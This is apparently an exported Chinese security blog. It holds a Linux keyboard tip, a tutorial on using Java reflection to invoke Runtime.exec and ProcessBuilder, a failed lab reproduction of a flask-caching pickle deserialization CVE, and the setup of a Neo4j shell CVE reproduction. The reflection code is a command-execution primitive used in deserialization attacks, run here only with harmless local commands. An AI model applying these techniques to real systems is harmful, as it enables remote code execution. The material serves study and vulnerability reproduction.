
<p>适配Linux</p>
<p>如上文所说，在Linux下使用时由于很多功能并不支持，并且F1~F12在Linux下作用很大，唯一的问题就是设置他们默认按键优先。方法如下：</p>
<pre><code>通过侧边的转换件切换到Windows模式下
在Windows下长按Fn+X+L4秒，直到键盘灯闪烁，使得键盘切换到F1~F12的默认按键优先
在Linux命令提示窗下输入如下命令：echo 0 | sudo tee /sys/module/hid_apple/parameters/fnmode
</code></pre>
<p>至此，大家就可以在Linux下美美的使用心爱的京东京造系列键盘了。<br>永久生效</p>
<p>以上方法只是输入命令后生效，想要永久生效，可以进行如下操作：</p>
<pre><code>创建/etc/modprobe.d/hid_apple.conf文件
在文件中添加以下一行内容并保存：options hid_apple fnmode=0
执行如下命令：sudo update-initramfs -u
重启
</code></pre>
<h2 id="转载的，原文链接"><a href="#转载的，原文链接" class="headerlink" title="转载的，原文链接"></a>转载的，原文链接</h2><p><a href="https://blog.csdn.net/u013832707/article/details/119107571">https://blog.csdn.net/u013832707/article/details/119107571</a></p>
<p><a href="https://mikeshade.com/posts/keychron-linux-function-keys/">https://mikeshade.com/posts/keychron-linux-function-keys/</a></p>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>从Java反射机制到RCE</title>
    <url>/2021/11/05/%E4%BB%8EJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%88%B0RCE/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前Java学了个寂寞，很多东西都没有涉及到，做项目也只是写业务逻辑CRUD没涉及到很多Java特性，一边整理姿势一边了解下Java参考</p>
<p>本文参考了<a href="https://www.guildhab.top/2020/04/java-rmi-%e5%88%a9%e7%94%a82-java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">Epicccal</a>师傅的文章</p>
<h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h2><p>定义如下：</p>
<blockquote>
<p><strong>Java 反射机制是指在程序运行时 , 对于任何一个类 , 都能知道这个类的所有属性和方法 , 对于任何一个实例对象 , 都能调用该对象的任何一个属性和方法 .</strong></p>
<p><strong>Java中这种 “ 动态获取信息 “ 和 “ 动态调用属性方法 “ 的机制被称为 Java 反射机制.</strong></p>
<p><strong>实例对象可以通过反射机制获取它的类 , 类可以通过反射机制获取它的所有方法和属性 . 获取的属性可以设值 , 获取的方法可以调用 .</strong></p>
</blockquote>
<p>简单地来说就是补充了Java作为静态语言在调用方法和属性上不灵活的缺点，通过这种机制得以动态的创建对象和调用其方法属性(写到这里有个疑问＂打断点的时候能访问对象属性是不是就是因为这个反射机制的存在＂)</p>
<span id="more"></span>

<p>Java反射的机制的功能:</p>
<ol>
<li>在程序运行时查找一个对象所属类</li>
<li>在程序运行时查找任意一个类的成员变量和方法</li>
<li>在程序运行时构造任意一个类的对象</li>
<li>在程序运行时调用任意一个方法的对象</li>
</ol>
<h3 id="查找一个对象所属类"><a href="#查找一个对象所属类" class="headerlink" title="查找一个对象所属类"></a>查找一个对象所属类</h3><ul>
<li><code>obj.getClass()</code></li>
<li><code>obj.forName(className)</code></li>
<li><code>className.class</code></li>
</ul>
<h3 id="查找一个类的方法"><a href="#查找一个类的方法" class="headerlink" title="查找一个类的方法"></a>查找一个类的方法</h3><ul>
<li><code>className.getMethod(functionName , [parameterTypes.class])</code></li>
<li><code>className.getMethods()</code></li>
<li><code>className.getDeclaredMethods()</code></li>
</ul>
<h3 id="构造任意一个类的对象"><a href="#构造任意一个类的对象" class="headerlink" title="构造任意一个类的对象"></a>构造任意一个类的对象</h3><ul>
<li><p><code>className.newInstance()</code>这个方法已被废弃，但不影响使用</p>
<p>使用这个函数的时候默认会调用无参数的构造函数</p>
<p>执行前提：</p>
<ol>
<li>类必须要有无参构造函数 .</li>
<li>类的构造函数不能是私有的 , 也就是不能通过 “<code>private</code>“ 修饰符来修饰构造函数 .</li>
</ol>
</li>
<li><p><code>className.getConstructor( parameterType ).newInstance( parameterName )</code></p>
<p>　会返回所有构造方法的一个子集，即public修饰符修饰的</p>
</li>
</ul>
<h3 id="调用任意一个实例对象的方法"><a href="#调用任意一个实例对象的方法" class="headerlink" title="调用任意一个实例对象的方法"></a>调用任意一个实例对象的方法</h3><ul>
<li><code>Method.invoke(obj , args[])</code></li>
</ul>
<p>demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflectTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">print</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException, NoSuchMethodException,</span></span><br><span class="line"><span class="function">            ClassNotFoundException, InvocationTargetException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String name = <span class="string">&quot;harry&quot;</span>;</span><br><span class="line">        <span class="comment">// Class.forName()返回一个类</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;reflectTest&quot;</span>);</span><br><span class="line">        <span class="comment">// newInstance()或者getDeclaredConstructor().newInstance()</span></span><br><span class="line">        <span class="comment">// 返回一个实例，类的实例化即对象</span></span><br><span class="line">        <span class="comment">// reflectTest obj = (reflectTest) cls.newInstance();</span></span><br><span class="line">        reflectTest obj = (reflectTest) cls.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">// getmethod获取一个类的所有方法，invoke用于调用任意一个实例的方法</span></span><br><span class="line">        Object ret = cls.getMethod(<span class="string">&quot;print&quot;</span>, String.class).invoke(obj, name);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>基本过程：</p>
<ol>
<li><p>获取命令执行的类，使用<code>Class.forName()</code></p>
</li>
<li><p>查看类中所有方法,使用<code>className.getMethods()</code></p>
</li>
<li><p>找到可利用的方法构造invoke,<code>Method.invoke(obj , args[])</code></p>
<p>obj是构造出来的类，method是想要执行的方法，args是需执行的命令</p>
<p><strong>正常情况访问是　静态方法：<code>类名.方法名</code>　成员函数：<code>对象名.方法名</code></strong></p>
<p><strong>invoke就相当于反过来，<code>方法名.invoke(类名)</code>或者<code>方法名.invoke(对象名)</code></strong></p>
</li>
</ol>
<p>可以利用的类一般有两种：</p>
<ol>
<li><code>java.lang.RunTime</code></li>
<li><code>java.lang.ProcessBuilder</code></li>
</ol>
<h3 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect2RCE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">reflect2RCE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">// 获取java.lang.Runtime的类</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Class.forName()方法获取任意类&quot;</span> + cls);</span><br><span class="line">        <span class="comment">// 通过getMethods,看看类中有啥可以利用的</span></span><br><span class="line">        Method[] methods = cls.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 同样地getDeclaredMethods也可以看</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636116274881-2021-11-520:44:34.png"></p>
<p>然后和刚刚一样试着invoke调用exec方法．</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取java.lang.Runtime的类</span></span><br><span class="line">Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Object obj = cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cls.newInstance(), <span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636117041051-2021-11-520:57:21.png"></p>
<p>报错，因为这个<code>java.lang.Runtime</code>中构造函数是私有的（ClassName.instance()这个函数会调自动用的无参构造函数）</p>
<p>绕过：</p>
<blockquote>
<p>使用反射时，类初始化的时候会对类中所有的静态方法进行调用，下图是源码，所以只要完成一个runtime类的初始化即可</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect2RCE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">reflect2RCE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 使用java.lang.runtime来进行反射</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reflect_runtime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">// 获取java.lang.Runtime的类</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="comment">// System.out.println(&quot;通过Class.forName()方法获取任意类&quot; + cls);</span></span><br><span class="line">        <span class="comment">// 通过getMethods,看看类中有啥可以利用的</span></span><br><span class="line">        <span class="comment">// Method[] methods = cls.getMethods();</span></span><br><span class="line">        <span class="comment">// for (Method m : methods) &#123;</span></span><br><span class="line">        <span class="comment">// System.out.println(m);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// 同样地getDeclaredMethods也可以看</span></span><br><span class="line">        <span class="comment">// Object obj = cls.getMethod(&quot;exec&quot;, String.class).invoke(cls.newInstance(),</span></span><br><span class="line">        <span class="comment">// args);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取方法(getRuntime,exec）</span></span><br><span class="line">        Method mGetRuntime = cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        Method mExec = cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 获取runtime的实例对象，无法通过无参数构造函数构造对象就绕过，通过静态方法执行</span></span><br><span class="line">        <span class="comment">// （以 Java 反射为例 , 在类初始化时会执行 static&#123;&#125; 代码块中的内容）</span></span><br><span class="line">        Object obj = mGetRuntime.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Process p = (Process) mExec.invoke(obj, <span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="comment">// 读取命令执行的文件流然后打印</span></span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// System.out.print(obj);</span></span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">                reflect2RCE r = <span class="keyword">new</span> reflect2RCE();</span><br><span class="line">        		r.reflect_runtime();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636118142763-2021-11-521:15:42.png"></p>
<p>RCE成功</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636118050871-2021-11-521:14:10.png"></p>
<h4 id="如何访问私有方法"><a href="#如何访问私有方法" class="headerlink" title="如何访问私有方法"></a>如何访问私有方法</h4><p>之前的调用Runtime执行系统命令没有直接调用它的那个私有方法，而是通过 <code>java.lang.Runtime</code> 执行系统命令时 , 由于该类的构造方法 <code>Runtime()</code> 是一个私有方法 , 所以我们不能调用该方法 , 只能通过 <code>getRuntime()</code> 静态方法来返回一个 <code>Runtime</code> 实例对象 , 然后再调用 <code>exec()</code> 方法</p>
<ul>
<li><p><code>className.getDeclaredConstructor()</code></p>
<p>会返回所有的构造方法，包括protected,private.</p>
<p>访问私有类可以将此函数的返回值(Constructor &lt;?&gt; )附加一个参数<code>className.setAccessible(true);</code></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用java.lang.runtime来进行反射</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reflect_runtime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">        IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">    <span class="comment">// 获取java.lang.Runtime的类</span></span><br><span class="line">    Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    Method mExec = cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行私有函数，非返回一个runtime方法调用静态方法的形式</span></span><br><span class="line">    Constructor&lt;?&gt; cst = cls.getDeclaredConstructor();</span><br><span class="line">    <span class="comment">//该值为真时表示反射的对象在使用时应会禁止java的语法访问检查</span></span><br><span class="line">    <span class="comment">//即public protect private无效</span></span><br><span class="line">    cst.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object obj = cst.newInstance();</span><br><span class="line"></span><br><span class="line">    Process p = (Process) mExec.invoke(obj, <span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取命令执行的文件流然后打印</span></span><br><span class="line">    InputStream is = p.getInputStream();</span><br><span class="line">    InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">    String line = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// System.out.print(obj);</span></span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="带参RCE"><a href="#带参RCE" class="headerlink" title="带参RCE"></a>带参RCE</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect2RCE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">reflect2RCE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用java.lang.ProcessBuilder</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reflect_processBuilder</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">// 无参数命令</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="comment">// Object obj = cls.getConstructor(List.class).newInstance(Arrays.asList(&quot;ls&quot;));</span></span><br><span class="line">        Method startCmd = cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        <span class="comment">// 带参命令</span></span><br><span class="line">        Object obj = cls.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;uname&quot;</span>, <span class="string">&quot;-a&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Process p = (Process) startCmd.invoke(obj);</span><br><span class="line">        <span class="comment">// 读取命令执行的文件流然后打印</span></span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// System.out.print(obj);</span></span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException </span>&#123;</span><br><span class="line">        reflect2RCE r = <span class="keyword">new</span> reflect2RCE();</span><br><span class="line">        <span class="comment">//调用reflect_processBuilder();        </span></span><br><span class="line">        r.reflect_processBuilder();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636176345817-2021-11-613:25:45.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过反射来执行RCE的基本流程就是</p>
<ol>
<li>构造存在RCE的类</li>
<li>构造存在RCE类中具体方法method</li>
<li>构造此类的实例对象obj</li>
<li>用实例对象obj和具体方法method使用invoke执行RCE</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>关于博客</title>
    <url>/2021/11/06/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>把之前的一些在本地的md文档笔记也都放了上来，搜索功能挺好用，经过几天的折腾一整个博客也基本上成形了，整挺好</p>
<p>这个月争取把论文整完把，还挺忙的，现在算是开题刚刚结束，不过还算充实．希望月底学校能放出去实习，不然就麻烦了．</p>
<p>现阶段还是稍安勿躁先把论文折腾完，然后有空多学点东西</p>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>复现cve-2021-33026</title>
    <url>/2021/11/12/%E5%A4%8D%E7%8E%B0cve-2021-33026/</url>
    <content><![CDATA[<h1 id="cve-2021-33026复现"><a href="#cve-2021-33026复现" class="headerlink" title="cve-2021-33026复现"></a>cve-2021-33026复现</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33026">cve-2021-3302</a></p>
<p><a href="https://github.com/CarlosG13/CVE-2021-33026">poc地址</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个五六月份的漏洞前几天看到了有poc公开了，看了下是flask + pickle + flask-caching的洞，就想着能不能复现一下</p>
<span id="more"></span>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境基本上没什么问题,建一个虚拟环境然后pip改装的包装装全，python需要&gt;=3.5这是flask-caching的要求</p>
<p>然后这个poc是对memcache的，所以装一个</p>
<h3 id="flask代码"><a href="#flask代码" class="headerlink" title="flask代码"></a>flask代码</h3><p>这是我根据它poc里面描述来写的，</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636698378634-2021-11-1214:26:18.png"></p>
<p>提示memcache里面存储的必须是会话cookie然后看它的截图我就给每此请求分配了一个uuid</p>
<p>然后按照我的理解，他的poc</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636698731944-2021-11-1214:32:11.png"></p>
<p>然后为了满足他的session:uuid的形式我在函数里实现类下，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">from</span> flask.json <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask_caching <span class="keyword">import</span> Cache</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> memcache</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">some_data = [<span class="string">&#x27;some&#x27;</span>, <span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line">mc = memcache.Client([<span class="string">&#x27;127.0.0.1:11211&#x27;</span>], debug=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cache = Cache()</span><br><span class="line">flask_app = Flask(__name__)</span><br><span class="line">flask_app.secret_key = <span class="string">b&#x27;xxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">cache.init_app(flask_app, &#123;<span class="string">&quot;CACHE_TYPE&quot;</span>: <span class="string">&quot;memcached&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@flask_app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve_2021_33026</span>():</span></span><br><span class="line">    <span class="comment">#没复现成功的关键应该在这，按照poc的意思是要将cookies反序列化？</span></span><br><span class="line">    <span class="comment">#cookie = str(uuid.uuid4())</span></span><br><span class="line">    <span class="comment">#resp = Response(&quot;set-Cookie&quot;)</span></span><br><span class="line">    <span class="comment">#resp.set_cookie(&#x27;session&#x27;, cookie)</span></span><br><span class="line">    <span class="comment">#stote = pickle.dumps(cookie)</span></span><br><span class="line">    <span class="comment">#mem_key = &#x27;session:&#x27; + cookie</span></span><br><span class="line">    <span class="comment">#mc.set(mem_key, stote)</span></span><br><span class="line">    <span class="comment">#pickle.loads(mc.get(mem_key))</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flask_app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5006</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后尝试了一下是否可以通过脚本…</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636701025254-2021-11-1215:10:25.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636698027881-2021-11-1214:20:27.png"></p>
<p>提示success但是</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636699387808-2021-11-1214:43:07.png"></p>
<p>也就是说cmd中的命令完全没有执行…</p>
<p>只是又发了一边请求而不是指定的命令…</p>
<p>应该是我的函数写的有点问题…</p>
<p>再琢磨琢磨</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>复现cve-2021-34371</title>
    <url>/2022/06/04/%E5%A4%8D%E7%8E%B0cve-2021-34371/</url>
    <content><![CDATA[<h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><p>git clone仓库<a href="https://github.com/neo4j/neo4j/tree/3.4.18">https://github.com/neo4j/neo4j/tree/3.4.18</a></p>
<p>注意分支，最后有漏洞的版本是3.4.18</p>
<p>按照官方教程安装</p>
<p><code>mvn clean install</code></p>
<ul>
<li><p><strong>修改一下配置文件，开启neo4j-shell</strong>（触发漏洞必要配置）</p>
<p><code>neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</code>的neo4j.conf</p>
<p>修改enabled为true</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Enable a remote shell server which Neo4j Shell clients can log in to.</span><br><span class="line">dbms.shell.enabled=true</span><br><span class="line"># The network interface IP the shell will listen on (use 0.0.0.0 for all interfaces).</span><br><span class="line">dbms.shell.host=127.0.0.1</span><br><span class="line"># The port the shell will listen on, default is 1337.</span><br><span class="line">dbms.shell.port=1337</span><br></pre></td></tr></table></figure></li>
</ul>
<p>cd到<code>packaging/standalone/target</code> 运行<code>bin/neo4j start</code></p>
<p>然后会看到启动成功的标识，访问<a href="http://localhost:7474/">http://localhost:7474/</a> 成功即安装完成</p>
<p>（仅复现可以不需要以下步骤，直接打payalod即可）</p>
<p>调试思路:</p>
<p><strong>为了可以调试，需要获取到他真正的启动命令，而不是直接用shell脚本启动</strong></p>
<p><strong>然后配置一下远程启动（配合调试）</strong></p>
<p>远程调试可以看这个<a href="https://www.cnblogs.com/Sincerity/p/11468390.html">https://www.cnblogs.com/Sincerity/p/11468390.html</a></p>
<p>目的就是让命令行运行的java虚拟机可以被idea调试（在有源码的情况下）</p>
<span id="more"></span>

<p>先从<code>bin/neo4j</code>中获取到实际命令行启动的参数</p>
<ol>
<li>获取实际运行命令</li>
</ol>
<p>在do_start()方法中加一条打印</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">do_start</span></span>() &#123;</span><br><span class="line">  check_status</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;NEO4J_PID:-&#125;</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Neo4j is already running (pid <span class="variable">$&#123;NEO4J_PID&#125;</span>).&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Starting Neo4j.&quot;</span></span><br><span class="line"></span><br><span class="line">  check_limits</span><br><span class="line">  build_classpath</span><br><span class="line"></span><br><span class="line">  assemble_command_line</span><br><span class="line">  command_line=(<span class="string">&quot;<span class="variable">$&#123;retval[@]&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;retval[@]&#125;</span>&quot;</span> <span class="comment"># 添加一条这个，然后观察命令行输出就可以获取到</span></span><br><span class="line">  nohup <span class="string">&quot;<span class="variable">$&#123;command_line[@]&#125;</span>&quot;</span> &gt;&gt;<span class="string">&quot;<span class="variable">$&#123;CONSOLE_LOG&#125;</span>&quot;</span> 2&gt;&amp;1 &amp;</span><br><span class="line"> <span class="comment"># 省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行<code>bin/neo4j start</code></p>
<p>大概是这样的结果</p>
